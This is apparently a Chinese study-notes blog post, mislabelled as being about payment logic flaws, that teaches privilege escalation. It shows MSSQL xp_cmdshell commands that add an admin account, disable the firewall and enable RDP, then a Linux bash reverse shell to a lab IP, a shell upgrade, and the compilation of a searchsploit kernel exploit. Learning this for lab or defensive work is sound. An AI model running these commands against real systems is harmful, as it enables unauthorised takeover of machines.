@@ -1,0 +1,286 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>支付逻辑漏洞 | 悟往之不谏，知来者可追</title><meta name="author" content="李书骏"><meta name="copyright" content="李书骏"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="提权操作 mssql数据库提权 Windows有自带数据库    在数据库查询进行提权  123456789RECONFIGUREEXEC sp_configure &amp;#x27;show advanced options&amp;#x27;,1RECONFIGUREEXEC sp_configure &amp;#x27;xp_cmdshell&amp;#x27;,1exec master..xp_cmdshell &amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="支付逻辑漏洞">
+<meta property="og:url" content="http://example.com/2024/01/13/mssql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="悟往之不谏，知来者可追">
+<meta property="og:description" content="提权操作 mssql数据库提权 Windows有自带数据库    在数据库查询进行提权  123456789RECONFIGUREEXEC sp_configure &amp;#x27;show advanced options&amp;#x27;,1RECONFIGUREEXEC sp_configure &amp;#x27;xp_cmdshell&amp;#x27;,1exec master..xp_cmdshell &amp;#x">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/123.png">
+<meta property="article:published_time" content="2024-01-13T15:31:19.407Z">
+<meta property="article:modified_time" content="2024-01-14T02:02:06.254Z">
+<meta property="article:author" content="李书骏">
+<meta property="article:tag" content="1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/123.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/01/13/mssql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '支付逻辑漏洞',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-14 10:02:06'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="悟往之不谏，知来者可追" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/123.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/2233.png')"><nav id="nav"><span id="blog-info"><a href="/" title="悟往之不谏，知来者可追"><span class="site-name">悟往之不谏，知来者可追</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">支付逻辑漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-01-13T15:31:19.407Z" title="Created 2024-01-13 23:31:19">2024-01-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-01-14T02:02:06.254Z" title="Updated 2024-01-14 10:02:06">2024-01-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="支付逻辑漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h1><ol>
+<li><h2 id="mssql数据库提权"><a href="#mssql数据库提权" class="headerlink" title="mssql数据库提权"></a>mssql数据库提权</h2></li>
+<li><h3 id="Windows有自带数据库"><a href="#Windows有自带数据库" class="headerlink" title="Windows有自带数据库"></a>Windows有自带数据库</h3></li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20240113232043019.png" alt="image-20240113232043019"></p>
+<ol start="2">
+<li><h3 id="在数据库查询进行提权"><a href="#在数据库查询进行提权" class="headerlink" title="在数据库查询进行提权"></a>在数据库查询进行提权</h3></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1</span><br><span class="line">exec master..xp_cmdshell &#x27;net user admin 1qaz@WSX /add&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;net localgroup administrators admin /add&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;netsh firewall set opmode disable&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;netstat -anop tcp | find &quot;3389&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><h3 id="提权数据解释"><a href="#提权数据解释" class="headerlink" title="提权数据解释"></a>提权数据解释</h3></li>
+<li><h4 id="指定数据库"><a href="#指定数据库" class="headerlink" title="指定数据库"></a>指定数据库</h4></li>
+</ol>
+<p><code>USE master</code>: 指定当前数据库环境为 master</p>
+<ol start="2">
+<li><h4 id="刷新服务器"><a href="#刷新服务器" class="headerlink" title="刷新服务器"></a>刷新服务器</h4></li>
+</ol>
+<p><code>RECONFIGURE</code>: 不重新启动 SQL Server 的情况下重新配置服务器</p>
+<ol start="3">
+<li><h4 id="显示高级选项"><a href="#显示高级选项" class="headerlink" title="显示高级选项"></a>显示高级选项</h4></li>
+</ol>
+<p><code>EXEC sp_configure &#39;show advanced options&#39;,1</code>: 启用显示高级选项，允许更改一些高级配置。 </p>
+<ol start="4">
+<li><h4 id="继续刷新服务器"><a href="#继续刷新服务器" class="headerlink" title="继续刷新服务器"></a>继续刷新服务器</h4></li>
+</ol>
+<p><code>RECONFIGURE</code>: 不重新启动 SQL Server 的情况下重新配置服务器</p>
+<ol start="5">
+<li><h4 id="启用xp-cmdshell"><a href="#启用xp-cmdshell" class="headerlink" title="启用xp_cmdshell"></a>启用xp_cmdshell</h4></li>
+</ol>
+<p><code>EXEC sp_configure &#39;xp_cmdshell&#39;,1</code>: 启用了 <code>xp_cmdshell</code> 这个特性，它允许执行操作系统级别的命令。 </p>
+<ol start="6">
+<li><h4 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h4></li>
+</ol>
+<p>这里的..是调用的意思，调用xp_cmdshell，然后再cmd里面进行操作</p>
+<p><code>exec master..xp_cmdshell &#39;net user admin 1qaz@WSX /add&#39;</code>: 创建一个名为 “admin” 的用户，密码是 “1qaz@WSX”</p>
+<ol start="7">
+<li><h4 id="添加到管理员组"><a href="#添加到管理员组" class="headerlink" title="添加到管理员组"></a>添加到管理员组</h4></li>
+</ol>
+<p>将自己创建的用户，添加到管理员组中，提升自己创建用户的权限</p>
+<p><code>exec master..xp_cmdshell &#39;net localgroup administrators admin /add&#39;</code>: 将刚刚创建的 “admin” 用户添加到本地管理员组中，赋予管理员权限。</p>
+<ol start="8">
+<li><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4></li>
+</ol>
+<p>将防火墙的模式设置为disable</p>
+<p><code>exec master..xp_cmdshell &#39;netsh firewall set opmode disable&#39;</code>: 关闭防火墙（Windows 防火墙）</p>
+<ol start="9">
+<li><h4 id="启用远程桌面连接"><a href="#启用远程桌面连接" class="headerlink" title="启用远程桌面连接"></a>启用远程桌面连接</h4></li>
+</ol>
+<p>使用REG ADD命令来修改注册表</p>
+<p>远程桌面的路径：HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server</p>
+<p> 设置注册表的值：&#x2F;v fDenyTSConnections</p>
+<p>指定要设置的值：&#x2F;t REG_DWORD</p>
+<p>禁止远程桌面连接的功能被禁用：&#x2F;d 0</p>
+<p>不显示任何确认信息：&#x2F;f  强制执行命令</p>
+<p> <code>exec master..xp_cmdshell &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal /v fDenyTSConnections /t REG_DWORD /d 0 /f&#39;</code>: 修改注册表，启用远程桌面连接，允许远程桌面连接到这台计算机。</p>
+<p>这条命令是在注册表中设置了一个名为 <code>fDenyTSConnections</code> 的项，将其值设为 <code>0</code>，这样的设置将允许远程桌面连接到这台计算机。通常情况下，远程桌面连接默认的端口为 <code>3389</code>，当远程桌面服务启用且防火墙允许时，其他计算机可以通过远程桌面协议连接到该计算机，并进行远程管理或操作</p>
+<ol start="10">
+<li><h4 id="查找3389的tcp连接"><a href="#查找3389的tcp连接" class="headerlink" title="查找3389的tcp连接"></a>查找3389的tcp连接</h4></li>
+</ol>
+<p><code>exec master..xp_cmdshell &#39;netstat -anop tcp | find &quot;3389&quot;&#39;</code>: 查找正在使用端口 3389 的 TCP 连接，通常这是远程桌面连接的默认端口。</p>
+<ol start="3">
+<li><h3 id="net命令解释"><a href="#net命令解释" class="headerlink" title="net命令解释"></a>net命令解释</h3></li>
+</ol>
+<p> <strong>net</strong>:<br>命令用于执行各种网络相关的操作，如管理用户、组、共享资源、网络连接等。它有许多子命令，可以执行不同的任务，例如： </p>
+<ul>
+<li><ul>
+<li><code>net user</code>: 用于管理系统用户账户，比如创建、删除、修改用户账户的命令。</li>
+<li><code>net share</code>: 用于管理共享资源，允许用户访问文件、打印机等共享资源。</li>
+<li><code>net view</code>: 查看网络上可用的计算机列表。</li>
+<li><code>net use</code>: 连接或断开共享资源的访问。</li>
+<li>等等。</li>
+</ul>
+</li>
+</ul>
+<p><strong>netsh</strong>:<br>用于配置和监视网络设置的命令行工具。它的功能更为广泛，可以用于管理各种网络组件和服务。通过 <code>netsh</code> 命令，可以进行网络接口配置、防火墙设置、网络路由配置、WLAN 设置等。例如；5555： </p>
+<ul>
+<li><ul>
+<li><code>netsh interface</code>: 用于配置网络接口，包括启用、禁用接口、设置 IP 地址、修改 DNS 设置等。</li>
+<li><code>netsh firewall</code>: 用于配置防火墙规则，可以开启或关闭防火墙，管理端口规则、应用程序规则等。</li>
+<li><code>netsh routing</code>: 用于配置和管理网络路由。</li>
+<li><code>netsh wlan</code>: 用于配置和管理 WLAN（无线局域网）设置。</li>
+</ul>
+</li>
+</ul>
+<p>总的来说，<code>net</code> 命令更专注于用户账户、共享资源等方面的管理，而 <code>netsh</code> 命令则更专注于系统网络配置和服务的管理。两者结合使用可以对 Windows 系统的网络功能进行全面的管理和配置。</p>
+<ol start="2">
+<li><h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2></li>
+</ol>
+<p>当用文件上传蚁剑连接后，权限只是网站权限，需要提权</p>
+<p>而且蚁剑的交互只是半交互，只能过去，回来受限</p>
+<p>可以用反弹shell，提升成全交互式</p>
+<p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20240113232631640.png" alt="image-20240113232631640"></p>
+<ol>
+<li><h4 id="提升成全交互"><a href="#提升成全交互" class="headerlink" title="提升成全交互"></a>提升成全交互</h4></li>
+</ol>
+<p>利用反弹shell，将shell发送到本地ip的4444端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20240113232741524.png" alt="image-20240113232741524"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.200.133/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>本地用<strong>nc -nvlp 4444</strong>监听4444端口</p>
+<p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20240113232845115.png" alt="image-20240113232845115"></p>
+<p>利用python将交互式提升</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>这里的shell还只是半交互式</p>
+<p>还需要进一步提升</p>
+<p>先用 <strong>ctrl+z</strong>退出</p>
+<p>然后后用<strong>stty raw -echo;fg;reset</strong> 继续连接，这里的shell已经成为全交互式</p>
+<p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20240113233000882.png" alt="image-20240113233000882"></p>
+<ol start="2">
+<li><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4></li>
+</ol>
+<p>先用<strong>uname -a</strong>去找到拿到的linux系统的版本号</p>
+<p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20240114093020283.png" alt="image-20240114093020283"></p>
+<p>利用漏洞工具searchesploit去找Linux版本相应的漏洞，然后过滤本地提权的漏洞</p>
+<p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20240113233056234.png" alt="image-20240113233056234"></p>
+<p>这里找到<strong>15285.c</strong>的漏洞</p>
+<p>用<strong>locate</strong>去定位漏洞位置</p>
+<p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20240114093355218.png" alt="image-20240114093355218"></p>
+<p>将漏洞位置复制到当前目录，然后进行传输</p>
+<p>这里我们是用蚁剑连接，可以直接拖到<strong>shell的tmp目录</strong>中（因为当前用户的权限很低，其他目录没有操作权限，只有tmp目录有权限）</p>
+<p>cd到shell的tmp目录，然后将.c文件进行编译成名字为exp的文件</p>
+<p><strong>gcc 15285.c -o exp</strong></p>
+<p>将exp文件增加可执行权限</p>
+<p><strong>chmod +x exp</strong> </p>
+<p>然后直接.<strong>&#x2F;exp执行文件</strong>就可以获取权限</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">李书骏</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/01/13/mssql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/">http://example.com/2024/01/13/mssql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/1/">1</a></div><div class="post_share"><div class="social-share" data-image="/img/123.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/13/%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90/" title="Wireshark流量溯源"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Wireshark流量溯源</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/07/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/" title="支付逻辑漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">支付逻辑漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/12/01/11.27%EF%BC%88%E6%B3%A8%E5%86%8Ctg%EF%BC%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%EF%BC%89/" title="11.27（python环境配置，永恒之黑）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-01</div><div class="title">11.27（python环境配置，永恒之黑）</div></div></a></div><div><a href="/2023/12/01/11.28%EF%BC%88%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E3%80%81%E5%A4%A7%E7%81%B0%E7%8B%BC%E8%BF%9C%E7%A8%8B%EF%BC%89/" title="11.28（钓鱼网站、大灰狼远程）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-01</div><div class="title">11.28（钓鱼网站、大灰狼远程）</div></div></a></div><div><a href="/2023/12/01/11.29%EF%BC%88Quasar%E8%BF%9C%E7%A8%8B%E8%BD%AF%E4%BB%B6%E3%80%81PHPstudy%E3%80%81%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E7%9A%84%E5%88%B6%E4%BD%9C%EF%BC%89/" title="11.29（Quasar远程软件、PHPstudy、钓鱼网站的制作）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-01</div><div class="title">11.29（Quasar远程软件、PHPstudy、钓鱼网站的制作）</div></div></a></div><div><a href="/2023/11/30/11-30(%E7%94%B5%E8%84%91%E7%A9%BA%E9%97%B4%E5%9B%9E%E6%94%B6%E3%80%81%E5%88%A9%E7%94%A8github%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2%EF%BC%89/" title="11-30(电脑空间回收、利用github搭建hexo博客）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-30</div><div class="title">11-30(电脑空间回收、利用github搭建hexo博客）</div></div></a></div><div><a href="/2023/12/02/12.1(OS%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8)/" title="12.1(linux的基本使用)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-02</div><div class="title">12.1(linux的基本使用)</div></div></a></div><div><a href="/2023/12/06/12.6(HTML5%E5%9F%BA%E7%A1%80%E4%BB%A5%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%EF%BC%89/" title="12.6(HTML5基础以及简单使用）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-06</div><div class="title">12.6(HTML5基础以及简单使用）</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/123.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">李书骏</div><div class="author-info__description">今日事，今日毕</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C"><span class="toc-number">1.</span> <span class="toc-text">提权操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mssql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.</span> <span class="toc-text">mssql数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E6%9C%89%E8%87%AA%E5%B8%A6%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.1.</span> <span class="toc-text">Windows有自带数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.2.</span> <span class="toc-text">在数据库查询进行提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%95%B0%E6%8D%AE%E8%A7%A3%E9%87%8A"><span class="toc-number">1.1.3.</span> <span class="toc-text">提权数据解释</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">指定数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B7%E6%96%B0%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">刷新服务器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E9%AB%98%E7%BA%A7%E9%80%89%E9%A1%B9"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">显示高级选项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%A7%E7%BB%AD%E5%88%B7%E6%96%B0%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">继续刷新服务器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E7%94%A8xp-cmdshell"><span class="toc-number">1.1.3.5.</span> <span class="toc-text">启用xp_cmdshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"><span class="toc-number">1.1.3.6.</span> <span class="toc-text">创建用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84"><span class="toc-number">1.1.3.7.</span> <span class="toc-text">添加到管理员组</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">1.1.3.8.</span> <span class="toc-text">关闭防火墙</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.1.3.9.</span> <span class="toc-text">启用远程桌面连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE3389%E7%9A%84tcp%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.1.3.10.</span> <span class="toc-text">查找3389的tcp连接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#net%E5%91%BD%E4%BB%A4%E8%A7%A3%E9%87%8A"><span class="toc-number">1.1.4.</span> <span class="toc-text">net命令解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">内核漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E6%88%90%E5%85%A8%E4%BA%A4%E4%BA%92"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">提升成全交互</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/14/Hackademic%20RTB1%E9%9D%B6%E6%9C%BA/" title="Hackademic：RTB1靶机">Hackademic：RTB1靶机</a><time datetime="2024-01-14T01:39:22.904Z" title="Created 2024-01-14 09:39:22">2024-01-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传漏洞">文件上传漏洞</a><time datetime="2024-01-13T15:39:24.018Z" title="Created 2024-01-13 